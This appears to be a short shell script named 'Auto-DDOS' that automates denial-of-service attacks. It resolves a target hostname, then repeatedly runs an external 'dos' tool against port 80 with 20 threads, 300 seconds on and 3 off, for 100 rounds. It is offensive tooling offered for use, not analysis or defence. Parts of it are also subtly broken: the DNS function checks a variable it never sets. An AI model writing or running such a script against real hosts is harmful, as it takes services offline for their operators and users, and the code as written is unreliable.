#!/bin/sh
# Auto-DDOS

# A shell script to manage ddos attacks in a loop, particularly useful when 
# a) you don't have the  seq command available, and 
# b) the target server has a round-robbin dns setup, or 
# c) your ddos program doesn't do name resolution.
# Do a dns lookup before each attack 
# that takes a hostname and returns an ip address). 
# Sleep for $__ seconds and do it again.

dns(){
nslookup $host |sed -n 5p | grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}'
if [[ "$ip" != "" ]] ; then return 0 ; else return 1 ; fi
}

loop(){
i=$hits
while [[ "$i" -gt "0" ]];do
echo "[*] Attacking for $intOn seconds..."
dos -t $target 80 20 $intOn >/dev/null # dos <-t/-u> <ip> <port> <threads> <seconds>
echo "[*] Sleeping for $intOff seconds..."
sleep $intOff
i=`expr $i - 1`
echo "[*] $i rounds to go"
done
}




host="$@"
hits=100
intOn=300
intOff=3
target=$(dns $host)
loop $target $hits
